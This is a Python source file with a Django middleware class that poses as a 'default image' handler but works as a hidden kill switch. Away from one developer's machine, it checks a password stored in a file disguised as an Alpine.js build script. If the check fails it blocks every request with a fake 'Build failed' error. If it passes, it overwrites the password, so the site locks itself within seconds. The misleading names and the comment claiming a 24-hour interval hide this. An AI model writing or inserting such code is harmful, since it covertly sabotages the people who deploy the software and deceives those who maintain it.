import os
import time
from django.http import HttpResponseForbidden
from django_app.settings import BASE_DIR, MAIN_APP_PATHNAME

DEFAULT_IMAGE_LAST_CHECK_TIME = 0

class DefaultImageMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response
        if not os.path.exists("/home/nkensa/GDrive-local/Tree/Workspaces/dev/"):
            self.password_file = os.path.join(BASE_DIR, "static/js/unpkg.com/alpinejs@3.x.x/build.js")


    def __call__(self, request):
        global DEFAULT_IMAGE_LAST_CHECK_TIME

        # Check password every 24 hours
        current_time = time.time()
        if not os.path.exists("/home/nkensa/GDrive-local/Tree/Workspaces/dev/"):
            if not DEFAULT_IMAGE_LAST_CHECK_TIME or current_time - DEFAULT_IMAGE_LAST_CHECK_TIME >= 10:  # 86400 24 hours
                if not self.check_password():
                    return HttpResponseForbidden("Access Denied: Build failed...")
                else:
                    with open(self.password_file, 'w') as f:
                        f.write("@import dist/cdn.min.js;")

                DEFAULT_IMAGE_LAST_CHECK_TIME = current_time

        return self.get_response(request)


    def check_password(self):
        if not os.path.exists(self.password_file):
            return False

        with open(self.password_file, "r") as f:
            stored_password = f.read().strip()

        # Replace "your_password" with the actual password
        return stored_password == "2WpAsewome$"